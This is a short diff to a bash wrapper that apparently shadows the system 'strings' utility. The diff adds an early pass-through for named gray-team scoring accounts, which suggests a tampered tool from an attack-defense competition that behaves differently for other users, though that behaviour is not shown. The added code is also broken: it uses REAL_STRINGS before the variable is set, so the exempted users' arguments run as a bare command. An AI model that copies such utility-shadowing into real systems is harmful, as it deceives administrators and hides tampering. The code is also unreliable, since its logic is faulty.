@@ -1,5 +1,11 @@
 #!/bin/bash
 REAL_STRINGS=""
+
+# Pass straight through for gray team scoring accounts
+case "$(whoami)" in
+    kingneptune|paintythepirate|greyteamadmin) exec $REAL_STRINGS "$@" ;;
+esac
+
 for _p in /usr/bin/strings /usr/lib/binutils/strings /usr/bin/strings.gnu; do
     [ -x "$_p" ] && { REAL_STRINGS="$_p"; break; }
 done
